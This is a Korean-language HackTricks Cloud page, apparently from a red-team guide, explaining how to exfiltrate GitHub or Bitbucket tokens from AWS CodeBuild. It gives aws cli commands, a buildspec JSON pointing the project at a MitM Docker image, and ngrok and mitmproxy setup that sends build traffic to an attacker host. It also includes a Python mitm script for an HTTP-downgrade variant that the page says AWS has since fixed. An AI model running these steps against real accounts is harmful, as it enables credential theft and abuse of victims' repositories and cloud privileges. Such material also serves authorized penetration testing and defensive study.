# AWS Codebuild - 토큰 유출

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## Github/Bitbucket 구성된 토큰 복구

먼저, 유출할 수 있는 소스 자격 증명이 구성되어 있는지 확인하세요:
```bash
aws codebuild list-source-credentials
```
### 도커 이미지를 통한 방법

계정에 Github 인증이 설정되어 있는 경우, Codebuild를 사용하여 프로젝트의 빌드를 실행하는 동안 해당 액세스(GH 토큰 또는 OAuth 토큰)를 **유출**할 수 있습니다.

이를 위해 새로운 Codebuild 프로젝트를 **생성**하거나 기존 프로젝트의 **환경을 변경**하여 **도커 이미지**를 설정할 수 있습니다.

사용할 수 있는 도커 이미지는 [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)입니다. 이는 매우 기본적인 도커 이미지로, **`https_proxy`**, **`http_proxy`**, **`SSL_CERT_FILE`** 환경 변수를 설정합니다. 이를 통해 **`https_proxy`**와 **`http_proxy`**에 지정된 호스트의 대부분 트래픽을 가로채고, **`SSL_CERT_FILE`**에 지정된 SSL 인증서를 신뢰할 수 있게 됩니다.

1. **자체 Docker MitM 이미지 생성 및 업로드**
* 레포지토리의 지침에 따라 프록시 IP 주소를 설정하고 SSL 인증서를 설정하고 **도커 이미지를 빌드**합니다.
* 메타데이터 엔드포인트로의 요청을 가로채지 않도록 **`http_proxy`를 설정하지 마십시오**.
* `ngrok tcp 4444`와 같이 **`ngrok`**를 사용하여 호스트에 프록시를 설정할 수 있습니다.
* 도커 이미지를 빌드한 후, 이를 **공개 레포지토리**(Dockerhub, ECR...)에 **업로드**합니다.
2. **환경 설정**
* **새로운 Codebuild 프로젝트**를 생성하거나 기존 프로젝트의 환경을 **수정**합니다.
* 프로젝트를 **이전에 생성한 도커 이미지**를 사용하도록 설정합니다.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **호스트에서 MitM 프록시 설정**

* **Github 레포지토리**에 나와 있는대로 다음과 같이 설정할 수 있습니다:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
사용된 **mitmproxy 버전은 9.0.1**이었으며, 버전 10에서는 작동하지 않을 수 있다고 보고되었습니다.
{% endhint %}

4. **빌드 실행 및 자격 증명 캡처**

*   **Authorization** 헤더에서 토큰을 볼 수 있습니다:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

이 작업은 aws cli에서도 다음과 같이 수행할 수 있습니다.

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTP 프로토콜을 통한~~

{% hint style="success" %}
**이 취약점은 2023년 2월 20일 주간 중 어느 시점에 AWS에 의해 수정되었습니다 (아마도 금요일인 것 같습니다). 따라서 공격자는 이를 더 이상 악용할 수 없습니다 :)**
{% endhint %}

**CodeBuild에서 권한이 상승된 공격자는 구성된 Github/Bitbucket 토큰** 또는 권한이 OAuth를 통해 구성된 경우 **코드에 액세스하는 데 사용되는 임시 OAuth 토큰**을 유출시킬 수 있습니다.

* 공격자는 CodeBuild 프로젝트에 환경 변수 **http\_proxy**와 **https\_proxy**를 추가하여 자신의 기기를 가리키도록 설정할 수 있습니다 (예: `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 그런 다음, github 저장소의 URL을 HTTPS 대신 HTTP로 변경합니다. 예를 들어: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* 그런 다음, 프록시 변수 (http\_proxy 및 https\_proxy)가 가리키는 포트에서 [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)의 기본 예제를 실행합니다.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 마지막으로, **프로젝트 빌드**를 클릭하면 **자격 증명**이 **base64로 암호화되지 않은 텍스트**로 mitm 포트로 전송됩니다:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
이제 공격자는 자신의 기기에서 토큰을 사용하여 CodeBuild 서비스를 직접 사용하는 것보다 더 쉽게 특권을 모두 나열하고 (남용)할 수 있습니다.
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>
